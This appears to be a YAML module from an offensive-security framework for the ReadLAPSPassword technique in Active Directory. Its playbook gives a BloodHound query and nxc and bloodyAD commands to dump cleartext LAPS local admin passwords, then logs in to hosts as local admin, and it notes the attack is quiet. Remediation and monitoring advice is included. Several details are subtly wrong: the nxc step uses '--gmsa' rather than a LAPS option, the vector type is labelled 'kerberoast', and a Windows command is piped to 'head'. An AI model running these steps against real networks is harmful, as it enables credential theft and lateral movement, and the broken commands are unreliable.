# ReadLAPSPassword → cleartext local admin password
#
# LAPS (Local Administrator Password Solution) stores the managed
# local admin password in AD as msLAPS-Password (or ms-Mcs-AdmPwd
# for legacy LAPS). Read access to that attribute is normally
# scoped to a narrow "LAPS readers" group + domain admins. But
# broken delegation, over-permissive OU inheritance, or a helpdesk
# group mistakenly granted the ExtendedRight is a common finding.
#
# ReadLAPSPassword lets the operator ldap-read one attribute and
# get a cleartext local admin password on every LAPS-managed host
# — a fleet-wide lateral primitive.
technique: T1555.005
name: BloodHound edge — ReadLAPSPassword → local admin cleartext
tactic: [credential-access, lateral-movement]
platform: [windows]
key: adroute:readlaps-password
ranking:
  exploitability: high             # one ldapsearch call once identified
  safety: read-only                # LDAP read, no writes
  detection: quiet                  # normal LDAP query traffic; hard to alert on
detect:
  group_member: Domain Users
execute:
  # On-host probe: check if LAPS attribute is populated on the
  # current computer (a common self-lookup that confirms LAPS is
  # deployed in the domain at all).
  command: |-
    dsquery * -filter "(&(objectClass=computer))" -attr name msLAPS-Password ms-Mcs-AdmPwd 2>nul | head -20
verify:
  success: "objectClass"
cleanup:
  command: ""
report:
  vector_type: kerberoast
  evidence: "on a domain (Domain Users); LAPS ReadLAPSPassword route worth checking"
  description: >
    LAPS-managed local admin passwords live on the computer
    object in AD (msLAPS-Password attribute; ms-Mcs-AdmPwd for
    legacy LAPS). Read access is controlled by an ExtendedRight;
    overly-broad delegation is a common finding. An operator with
    the right on a subset of computers can read local admin
    cleartext for every host in that subset — a fleet-wide
    lateral primitive with a single query.
  remediation: >
    Restrict the ReadLAPSPassword ExtendedRight to a narrow set
    of principals (typically only Domain Admins + a scoped
    "LAPS readers" group). Rotate LAPS-managed passwords
    fleet-wide when the finding drops (a compromised read grant
    means every historical read is a compromised password).
    Monitor LDAP queries requesting the msLAPS-Password attribute.
  refs: [T1555.005, ReadLAPSPassword, laps]
playbook:
  summary: >
    Domain foothold — check BloodHound for ReadLAPSPassword
    edges from your owned principals. Every reachable computer's
    local admin password is one LDAP query away.
  place: 'attacker-side (nxc / bloodyAD)'
  steps:
    - "in BloodHound: MATCH p=(u:User {owned:true})-[r:ReadLAPSPassword]->(c:Computer) RETURN p"
    - "for each reachable computer C, dump the LAPS password: `nxc ldap <dc> -u <owned-user> -p <pass> --gmsa` (nxc handles both msLAPS-Password and ms-Mcs-AdmPwd)"
    - "OR via bloodyAD: `bloodyAD -d CORP.LOCAL -u <owned-user> -p <pass> --host <dc> get object <C> --attr msLAPS-Password`"
    - "use the recovered password to log in to C as local admin (`nxc smb <C> -u Administrator -p '<laps-pw>' --local-auth`)"
    - "no cleanup needed — read-only operation"
  restore: ""
